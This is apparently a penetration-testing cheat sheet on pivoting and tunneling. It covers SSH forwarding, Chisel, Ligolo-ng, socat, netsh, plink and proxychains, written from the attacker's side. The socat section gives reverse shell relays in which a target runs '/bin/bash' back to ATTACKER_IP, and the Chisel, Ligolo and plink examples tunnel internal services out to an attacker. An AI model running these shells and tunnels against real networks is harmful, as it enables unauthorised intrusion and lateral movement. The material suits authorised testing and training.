# Pivoting & Tunneling

## SSH-Tunneling


## Local Port Forwarding

```bash
# Forward local port to remote host through SSH
# Access remote service locally
ssh -L LOCAL_PORT:TARGET_IP:TARGET_PORT user@SSH_SERVER

# Example: Access internal web server (172.16.1.10:80) through SSH server
ssh -L 8080:172.16.1.10:80 user@ssh-server.com
# Then browse to http://localhost:8080

# Bind to all interfaces (not just localhost)
ssh -L 0.0.0.0:8080:172.16.1.10:80 user@ssh-server.com
```

## Remote Port Forwarding

```bash
# Forward remote port to local machine
# Expose local service to remote network
ssh -R REMOTE_PORT:LOCAL_IP:LOCAL_PORT user@SSH_SERVER

# Example: Expose local port 80 on remote server's port 8080
ssh -R 8080:localhost:80 user@remote-server.com

# Enable GatewayPorts on SSH server (/etc/ssh/sshd_config)
GatewayPorts yes
```

## Dynamic Port Forwarding (SOCKS Proxy)

```bash
# Create SOCKS proxy
ssh -D LOCAL_PORT user@SSH_SERVER

# Example: Create SOCKS5 proxy on port 1080
ssh -D 1080 user@ssh-server.com

# Configure proxychains (/etc/proxychains4.conf)
# Add: socks5 127.0.0.1 1080

# Use with tools
proxychains nmap -sT -Pn 172.16.1.0/24
proxychains firefox
proxychains curl http://internal-server
```

## SSH Options

```bash
# Run in background
ssh -f -N -L 8080:target:80 user@ssh-server

# Options:
-f : Background
-N : No command execution
-L : Local forward
-R : Remote forward
-D : Dynamic forward
-v : Verbose
-4 : Force IPv4
-6 : Force IPv6
```

## Chisel


## Installation

```bash
# Download from: https://github.com/jpillora/chisel/releases
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
chmod +x chisel_1.9.1_linux_amd64
```

## Reverse Port Forward

```bash
# Attacker (Server)
./chisel server -p 8000 --reverse

# Target (Client) - Forward target's port 80 to attacker's port 8080
./chisel client ATTACKER_IP:8000 R:8080:localhost:80

# Access on attacker
curl http://localhost:8080
```

## Forward Port Forward

```bash
# Target (Server)
./chisel server -p 8000

# Attacker (Client) - Forward attacker's port 8080 to target's internal network
./chisel client TARGET_IP:8000 8080:172.16.1.10:80

# Access on attacker
curl http://localhost:8080
```

## SOCKS Proxy

```bash
# Attacker (Server)
./chisel server -p 8000 --reverse

# Target (Client) - Create SOCKS proxy
./chisel client ATTACKER_IP:8000 R:socks

# Configure proxychains to use 127.0.0.1:1080
proxychains nmap -sT 172.16.1.0/24
```

## Multiple Ports

```bash
# Forward multiple ports
./chisel client ATTACKER_IP:8000 R:8080:localhost:80 R:3389:10.10.10.5:3389 R:445:10.10.10.10:445
```

## Ligolo


## Setup

```bash
# Download from: https://github.com/nicocha30/ligolo-ng/releases

# Attacker (Proxy)
./proxy -selfcert

# Target (Agent)
./agent -connect ATTACKER_IP:11601 -ignore-cert
```

## Usage

```bash
# On proxy interface, select session
session

# List sessions
» session

# Select session
» 1

# Add route to internal network
sudo ip route add 172.16.1.0/24 dev ligolo

# Start tunnel
» start

# Access internal network
nmap 172.16.1.10
ssh user@172.16.1.10
```

## Port Forwarding

```bash
# On proxy, forward listener
listener_add --addr 0.0.0.0:4444 --to 172.16.1.10:445

# Access on attacker
smbclient -L //localhost -p 4444
```

## Socat


## Installation

```bash
sudo apt install socat
```

## Port Forwarding

```bash
# Forward local port to remote host
socat TCP-LISTEN:8080,fork TCP:TARGET_IP:80

# Example: Forward local 8080 to target's 80
socat TCP-LISTEN:8080,fork,reuseaddr TCP:192.168.1.10:80
```

## Reverse Shell Relay

```bash
# Attacker (Listener)
nc -nlvp 443

# Pivot box (Relay)
socat TCP-LISTEN:8080,fork TCP:ATTACKER_IP:443

# Target (Connect to pivot)
nc PIVOT_IP 8080 -e /bin/bash
```

## Encrypted Relay

```bash
# Generate certificate
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
cat shell.key shell.crt > shell.pem

# Listener
socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0,fork STDOUT

# Client
socat OPENSSL:ATTACKER_IP:443,verify=0 EXEC:/bin/bash
```

## Windows-Tunneling


## Netsh

### Port Forwarding
```powershell
# Add port forward rule
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.1.10

# View rules
netsh interface portproxy show all

# Delete rule
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0

# Firewall rule (allow inbound)
netsh advfirewall firewall add rule name="Port Forward 8080" protocol=TCP dir=in localport=8080 action=allow
```

---

## Plink (PuTTY)

### Reverse SSH Tunnel
```powershell
# Windows to Linux SSH server
# Create reverse tunnel to expose Windows RDP to Linux box

plink.exe -ssh -l user -pw password -R 3389:localhost:3389 ATTACKER_IP

# On attacker
rdesktop localhost:3389
```

### Dynamic Port Forward
```powershell
# Create SOCKS proxy
plink.exe -ssh -l user -pw password -D 1080 ATTACKER_IP
```

## ProxyChains


## Configuration

### Edit Config
```bash
sudo nano /etc/proxychains4.conf
```

### Example Config
```
# Dynamic chain (tries each proxy)
dynamic_chain

# Or strict chain (uses all proxies in order)
#strict_chain

# Proxy DNS requests
proxy_dns

# Proxy list
[ProxyList]
socks5 127.0.0.1 1080
```

## Usage

```bash
proxychains <command>

# Examples
proxychains nmap -sT -Pn 172.16.1.10
proxychains curl http://internal-site
proxychains firefox
proxychains evil-winrm -i 172.16.1.10 -u admin -p password
```

## Common Scenarios

### Access Internal Web Server
```bash
# SSH local forward
ssh -L 8080:172.16.1.10:80 user@pivot

# Or Chisel
./chisel client PIVOT:8000 8080:172.16.1.10:80

# Browse
firefox http://localhost:8080
```

### RDP to Internal Windows
```bash
# SSH local forward
ssh -L 3389:172.16.1.10:3389 user@pivot

# Or Chisel
./chisel client PIVOT:8000 3389:172.16.1.10:3389

# Connect
xfreerdp /v:localhost /u:administrator /p:password
```

### Full Network Pivoting
```bash
# SSH dynamic forward
ssh -D 1080 user@pivot

# Or Chisel SOCKS
./chisel client PIVOT:8000 R:socks

# Configure proxychains
proxychains nmap -sT 172.16.1.0/24
proxychains smbclient -L //172.16.1.10
```

